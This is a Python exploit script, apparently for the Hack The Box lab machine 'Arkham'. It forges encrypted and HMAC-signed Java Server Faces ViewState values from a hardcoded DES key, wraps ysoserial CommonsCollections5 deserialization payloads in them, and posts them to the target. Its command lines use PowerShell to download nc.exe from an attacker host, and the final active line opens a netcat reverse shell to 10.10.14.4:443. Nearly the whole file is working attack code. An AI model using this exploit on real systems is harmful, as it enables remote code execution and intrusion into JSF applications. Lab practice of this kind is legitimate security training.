#from Crypto.Cipher import DES
import pyDes
import base64
import hmac
import hashlib
import requests
import subprocess
import os

vs = "wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE="
vs = base64.b64decode(vs)
#print ("[+] vs b64decoded: " + str(vs))

key_b64 = "SnNGOTg3Ni0="
key = base64.b64decode(key_b64)
#print ("[+] key b64decoded: " + (str(key)))

#try finding MAC placement
def find_mac_pos():
    mac = vs[:20] #first 20
    enc = vs[20:]
    mac = vs[-20:] #last 20
    enc = vs[:-20]
    test = hmac.new(key, enc, hashlib.sha1).digest()
    #print ("[+] test: " + str(test))
    #print ("[+] mac: " + str(mac))
    pass

def decrypt(vs,key):
    enc = vs[:-20]
    d = pyDes.des(key).decrypt(enc)
    #print ("[+] d: " + str(d))
    return d

def encrypt(payload,key):
    e = pyDes.des(key).encrypt(payload,padmode=pyDes.PAD_PKCS5) #padding added later during ysoserial generation
    #print ("[+] e: " + str(e))
    return e

def hash_enc(enc):
    h = hmac.new(key, enc, hashlib.sha1).digest()
    r = enc + h
    #print ("[+] r: " + str(r))
    return r

#d = decrypt(vs,key)
#r = hash_enc(encrypt(d,key))
#if (r == vs):
#    print ("[+] yes!")

def serial(cmd):
    #ysoserial CommonsCollections1 "ping 10.10.14.3" > test.serial
    with open(os.devnull,'w') as null: #cool trick to redirect stderr
        serial = subprocess.check_output(['ysoserial','CommonsCollections5',cmd],stderr=null)
    #print (type(serial))
    serial = hash_enc(encrypt(serial,key))
    serial = base64.b64encode(serial)
    serial = serial.decode()
    #print (serial)
    return serial

#serial()

def send(cmd):
    session = requests.session()
    burp0_url = "http://arkham.htb:8080/userSubscribe.faces"

    r = session.get(burp0_url)
    #print (r.text.split(" "))

    #get jsessionid
    text = r.text.split(" ")
    jsessionid = ""
    viewstate = ""
    for i in range(len(text)-1):
        if 'jsessionid' in text[i]:
            jsessionid = text[i].split(";")[1][:-1]
        if 'id="javax.faces.ViewState"' in text[i]:
            viewstate = text[i+1].split('"')[1]
    print ("[+] jid: " + jsessionid)
    print ("[+] vs: " + viewstate)

    viewstate = serial(cmd)

    burp0_data = {
            "j_id_jsp_1623871077_1:email": "hellohaha",
            "j_id_jsp_1623871077_1:submit": "SIGN UP",
            "j_id_jsp_1623871077_1_SUBMIT": "1",
            "javax.faces.ViewState": "%s" % viewstate
            }
    r = session.post(burp0_url, data=burp0_data)
    if "Thanks your email" in r.text:
        print ("[+] post sent successfully")

    #print (r.text)
    pass

#send('ping 10.10.14.3')
#send('powershell -c Invoke-WebRequest -Uri "http://10.10.14.4/nc.exe" -OutFile "c:\\windows\\System32\\spool\\drivers\\color\\n.exe"') #worked
send('c:\\windows\\System32\\spool\\drivers\\color\\n.exe -e cmd.exe 10.10.14.4 443') #works
